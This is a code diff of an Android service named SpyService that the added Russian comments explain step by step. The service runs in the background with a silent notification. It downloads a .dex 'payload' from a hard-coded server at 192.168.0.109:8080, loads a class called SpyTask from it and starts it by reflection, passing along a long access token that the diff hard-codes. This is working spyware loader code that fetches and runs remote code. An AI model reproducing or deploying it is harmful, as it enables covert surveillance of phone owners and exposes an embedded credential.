@@ -25,8 +25,8 @@ public class SpyService extends JobIntentService {
     private final Logger logger = Logger.getLogger(this.getClass().getName());
     private final ExecutorService executor = Executors.newSingleThreadExecutor();
     private Object dexTask;
-    private final String IP = "192.168.0.102";
-    private final String TOKEN = "";
+    private final String IP = "192.168.0.109";
+    private final String TOKEN = "Q9uG1UBmH44AAAAAAAAAAV0CGzTA6jQ1T3z87VIpa5syshCdMEuBIewOZnkjX_I7";
 
     @Override
     public void onCreate() {
@@ -35,6 +35,7 @@ public class SpyService extends JobIntentService {
     }
 
     private void startMyOwnForeground(){
+        // Создаем фоновую задачу и настраиваем ее отображение в таскбаре
         String NOTIFICATION_CHANNEL_ID = "com.example.spyapp";
         String channelName = "My Background Service";
         NotificationChannel channel = new NotificationChannel(NOTIFICATION_CHANNEL_ID, channelName, NotificationManager.IMPORTANCE_NONE);
@@ -44,6 +45,7 @@ public class SpyService extends JobIntentService {
         assert manager != null;
         manager.createNotificationChannel(channel);
 
+        // Задаем параметры фонового сервиса (имя, икока, категория...)
         NotificationCompat.Builder notificationBuilder = new NotificationCompat.Builder(this, NOTIFICATION_CHANNEL_ID);
         Notification notification = notificationBuilder.setOngoing(true)
                 .setSmallIcon(R.mipmap.ic_launcher_round)
@@ -56,9 +58,12 @@ public class SpyService extends JobIntentService {
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
+        // Запускаем загрузку полезной нагрузки в виде .dex файла в отдельном потоке
         Future future = executor.submit(this::downloadTask);
         try {
+            // Ожидаем завершения загрузки и получаем загруженный объект в виде класса
             dexTask = future.get();
+            // Вызываем у загруженного класса метод start средствами рефлексии
             dexTask.getClass().getMethod("start").invoke(dexTask);
         } catch (Exception e) {
             logger.info(e.getMessage());
@@ -70,6 +75,7 @@ public class SpyService extends JobIntentService {
     @Override
     public void onDestroy() {
         super.onDestroy();
+        // Останавливаем задачу
         executor.shutdown();
         try {
             dexTask.getClass().getMethod("stop").invoke(dexTask);
@@ -99,6 +105,7 @@ public class SpyService extends JobIntentService {
 
         try {
             logger.info("download started.");
+            // Загружаем файл с сервера
             connection = (HttpURLConnection) (new URL("http://" + IP + ":8080/downloads/" + filename).openConnection());
             connection.connect();
 
@@ -117,8 +124,11 @@ public class SpyService extends JobIntentService {
 
             logger.info("download completed.");
 
+            // Получаем класс лоадер для скачанного файла
             PathClassLoader classLoader = new PathClassLoader(file.getAbsolutePath(), getClassLoader());
+            // Загружаем класс из файла
             Class<?> clazz = classLoader.loadClass("com.example.dexmodule.SpyTask");
+            // Создаем новый инстанс класса
             c = (Object) clazz.getDeclaredConstructor(Context.class, String.class, String.class).newInstance(getBaseContext(), IP, TOKEN);
 
             logger.info("dex class loaded.");
